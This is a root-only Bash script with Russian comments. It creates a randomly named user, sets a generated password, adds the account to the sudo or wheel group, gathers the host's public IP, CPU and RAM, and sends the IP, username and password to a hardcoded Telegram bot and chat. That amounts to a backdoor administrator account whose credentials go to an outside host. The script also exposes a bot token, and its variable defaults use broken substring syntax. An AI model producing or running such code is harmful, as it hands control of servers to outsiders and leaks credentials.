#!/usr/bin/env bash
set -euo pipefail

# ----------------- Настройки (по умолчанию) -----------------
TELEGRAM_TOKEN="${TELEGRAM_TOKEN:7970006252:AAGvvJOLh9k2M_XU75WbdlL-JOjpYG8BS8I}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:7067095050}"
PREFIX="${PREFIX:-user}"

err() { echo "ERROR: $*" >&2; exit 1; }
warn() { echo "WARN: $*" >&2; }

# проверки наличия команд
for cmd in useradd chpasswd curl awk head tr nproc ip; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    err "Требуется команда '$cmd' — установите её и повторите."
  fi
done

if [ "$EUID" -ne 0 ]; then
  err "Этот скрипт должен быть запущен от root."
fi

gen_username() {
  local suffix
  suffix="$(head -c16 /dev/urandom | sha256sum | cut -c1-6)"
  printf "%s%s" "$PREFIX" "$suffix"
}

gen_password() {
  local pass
  pass="$(tr -dc 'A-Za-z0-9!@%_-+=' < /dev/urandom | head -c16 || true)"
  while [ "${#pass}" -lt 12 ]; do
    pass="${pass}$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c4)"
  done
  if ! echo "$pass" | grep -q '[A-Z]'; then pass="A${pass:1}"; fi
  if ! echo "$pass" | grep -q '[a-z]'; then pass="a${pass:1}"; fi
  if ! echo "$pass" | grep -q '[0-9]'; then pass="1${pass:1}"; fi
  echo "$pass"
}

get_cpu() {
  if command -v nproc >/dev/null 2>&1; then
    nproc --all
  else
    awk '/^processor/ {c++} END{print c+0}' /proc/cpuinfo
  fi
}

get_ram_gb() {
  awk '/MemTotal/ {printf "%.2f", $2/1024/1024}' /proc/meminfo
}

# ---- Обновлённая функция получения публичного IPv4 ----
get_public_ip() {
  local ip
  # Список сервисов: curl -4 принудительно использует IPv4
  for svc in "https://ifconfig.co" "https://icanhazip.com" "https://ifconfig.me/ip" "https://v4.ifconfig.co"; do
    ip="$(curl -4 -s --max-time 5 "$svc" || true)"
    ip="${ip%%$'\n'*}"
    # быстрый валидационный grep на формат IPv4
    if [[ -n "$ip" ]] && echo "$ip" | grep -E -q '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
      printf "%s" "$ip"
      return 0
    fi
  done

  # Локальный fallback: первый глобальный IPv4 интерфейс
  ip="$(ip -4 addr show scope global 2>/dev/null | awk '/inet /{print $2; exit}' | cut -d/ -f1 || true)"
  if [[ -n "$ip" ]]; then
    printf "%s" "$ip"
    return 0
  fi

  # Последняя попытка: hostname -I и взять IPv4
  ip="$(hostname -I 2>/dev/null | tr ' ' '\n' | grep -m1 -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' || true)"
  if [[ -n "$ip" ]]; then
    printf "%s" "$ip"
    return 0
  fi

  echo "unknown"
}

# ----------------- Основная логика -----------------
USERNAME="$(gen_username)"
PASSWORD="$(gen_password)"
CPU="$(get_cpu)"
RAM_GB="$(get_ram_gb)"
IP="$(get_public_ip)"

if id -u "$USERNAME" >/dev/null 2>&1; then
  err "Пользователь $USERNAME уже существует (неожиданно)."
fi

useradd -m -s /bin/bash "$USERNAME" || err "useradd не удался"
echo "${USERNAME}:${PASSWORD}" | chpasswd || err "Установка пароля не удалась"

if [ -f /etc/debian_version ]; then
  usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
elif [ -f /etc/redhat-release ] || [ -f /etc/centos-release ] || [ -f /etc/fedora-release ]; then
  usermod -aG wheel "$USERNAME" || warn "Не удалось добавить в группу wheel"
else
  if getent group sudo >/dev/null 2>&1; then
    usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
  else
    groupadd -f sudo || true
    usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
  fi
fi

MSG="ip: ${IP}
user: ${USERNAME}
pass: ${PASSWORD}
cpu: ${CPU}
ram: ${RAM_GB} gb"

TELEGRAM_API="https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage"

if ! curl -s -X POST "$TELEGRAM_API" -d chat_id="${TELEGRAM_CHAT_ID}" --data-urlencode "text=${MSG}" >/dev/null; then
  warn "Не удалось отправить сообщение в Telegram. Проверьте сетевой доступ и корректность токена/ID."
fi

echo "=== USER CREATED ==="
echo "user: $USERNAME"
echo "pass: $PASSWORD"
echo "ip: $IP"
echo "cpu: $CPU"
echo "ram: ${RAM_GB} gb"
echo "telegram_chat_id: ${TELEGRAM_CHAT_ID}"

exit 0
